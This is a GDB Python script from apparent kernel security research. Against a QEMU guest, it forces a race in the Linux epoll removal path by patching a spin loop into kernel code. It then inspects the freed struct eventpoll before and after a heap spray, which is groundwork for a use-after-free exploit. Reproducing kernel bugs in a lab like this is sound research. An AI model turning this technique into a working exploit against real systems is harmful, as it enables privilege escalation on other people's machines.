import gdb
import time

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set non-stop off")

gdb.execute("set logging file evidence/EXP-018_raw_gdb.log")
gdb.execute("set logging overwrite on")
gdb.execute("set logging enabled on")

def log(msg):
    print(f"[*] {msg}", flush=True)

def connect():
    for i in range(10):
        try:
            gdb.execute("target remote :1234")
            log("Connected to QEMU")
            return True
        except gdb.error as e:
            log(f"Connection failed: {e}, retrying...")
            time.sleep(1)
    return False

if not connect():
    log("Failed to connect.")
    gdb.execute("quit")

target_epoll_addr = 0

class RaceControl(gdb.Breakpoint):
    def __init__(self):
        super(RaceControl, self).__init__("*(__ep_remove + 0x19c)", internal=False)
        self.target_epoll = None

    def stop(self):
        log(f"Thread A hit __ep_remove+0x19c (WRITE_ONCE finished).")
        
        target_file = int(gdb.parse_and_eval("$x23"))
        self.target_epoll = int(gdb.parse_and_eval(f"*(long*)({target_file} + 32)"))
        
        log(f"target_file={hex(target_file)}, target_epoll={hex(self.target_epoll)}")
        
        orig_insn = int(gdb.parse_and_eval(f"*(int*)($pc)"))
        log(f"Original instruction at PC: {hex(orig_insn)}")
        
        gdb.execute(f"set *(int*)($pc) = 0x14000000")
        log("Patched PC with infinite loop to suspend Thread A!")
        
        EpFreeBreak()
        self.enabled = False
        return False

class EpFreeBreak(gdb.Breakpoint):
    def __init__(self):
        super(EpFreeBreak, self).__init__("*0xffff8000802bcbb4", internal=False)

    def stop(self):
        ep = int(gdb.parse_and_eval("$x22"))
        log(f"Thread B hit ep_free({hex(ep)})!")
        EpFreeFinish(ep)
        self.enabled = False
        return False

import threading
import os
import signal

class EpFreeFinish(gdb.Breakpoint):
    def __init__(self, target_epoll):
        super().__init__("*0xffff8000802bcbbc")
        self.target_epoll = target_epoll

    def stop(self):
        log(f"Thread B finished ep_free. target_epoll is now FREED!")
        
        log("Memory dump of freed struct eventpoll (BEFORE spray):")
        try:
            mem_dump = gdb.execute(f"x/24gx {self.target_epoll}", to_string=True)
            log("\n" + mem_dump)
        except Exception as e:
            log(f"Error reading memory: {e}")
            
        def interrupt_later():
            time.sleep(2.0)
            log("Timer fired! Interrupting GDB to check spray...")
            os.kill(os.getpid(), signal.SIGINT)
            
        t = threading.Thread(target=interrupt_later)
        t.daemon = True
        t.start()
        
        self.enabled = False
        return False

def stop_handler(event):
    if isinstance(event, gdb.SignalEvent):
        if event.stop_signal == "SIGINT":
            log("Interrupted! Dumping memory (AFTER spray):")
            try:
                addr = RaceControl_instance.target_epoll
                mem_dump = gdb.execute(f"x/24gx {addr}", to_string=True)
                log("\n" + mem_dump)
                log("Spray successful! Exiting GDB.")
            except Exception as e:
                log(f"Error in stop handler: {e}")
            gdb.execute("quit")

gdb.events.stop.connect(stop_handler)

RaceControl_instance = RaceControl()
log("Breakpoints set. Continuing execution.")

# Start a timer to interrupt GDB if it hangs
def interrupt_if_hung():
    time.sleep(15.0)
    log("Hang timeout! Interrupting GDB to check spray...")
    os.kill(os.getpid(), signal.SIGINT)

t_hung = threading.Thread(target=interrupt_if_hung)
t_hung.daemon = True
t_hung.start()

try:
    gdb.execute("c")
except KeyboardInterrupt:
    pass
except gdb.error as e:
    log(f"Execution stopped: {e}")

gdb.execute("quit")

